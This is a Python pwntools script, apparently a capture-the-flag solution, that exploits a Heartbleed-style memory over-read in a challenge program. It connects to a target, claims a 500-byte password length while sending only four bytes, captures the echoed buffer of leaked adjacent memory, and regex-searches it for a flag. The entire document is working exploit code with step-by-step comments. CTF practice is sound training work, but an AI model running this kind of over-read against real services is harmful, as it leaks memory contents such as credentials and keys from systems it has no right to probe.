from pwn import *
import re

# Set up the target. 
# Use process() for local testing, or remote() for the actual CTF server.
# target = process('./heartbleed') 
target = remote('127.0.0.1', 1337) # Replace with the actual CTF IP and port

# --- Step 1: The Setup ---
# Wait for the prompt asking for the password length
target.recvuntil(b"How many bytes in length is your password?\n")

# Tell the program we are sending a massive password to trigger the over-read
fake_length = 500
target.sendline(str(fake_length).encode())

# --- Step 2: The Exploit ---
# The program will now wait for our password. 
# We send a tiny string, leaving the remaining 496 bytes uninitialized.
target.sendline(b"pwn!")

# --- Step 3: Harvesting the Leak ---
# Wait for the program to echo our password back
target.recvuntil(b"Your successfully stored password:\n")

# Receive the next 500 bytes (our 4 bytes + 496 bytes of leaked adjacent memory)
leaked_memory = target.recv(fake_length)

print("\n[*] Raw Leaked Memory:")
print(leaked_memory)

# --- Step 4: Parsing the Flag ---
# Use a regular expression to automatically find standard flag formats in the noise
match = re.search(b'(picoCTF\{.*?\}|flag\{.*?\})', leaked_memory)

if match:
    print(f"\n[+] SUCCESS! Flag found: {match.group(0).decode('utf-8', errors='ignore')}")
else:
    print("\n[-] Flag not found in this chunk. Try increasing the fake_length variable!")

# Close the connection
target.close()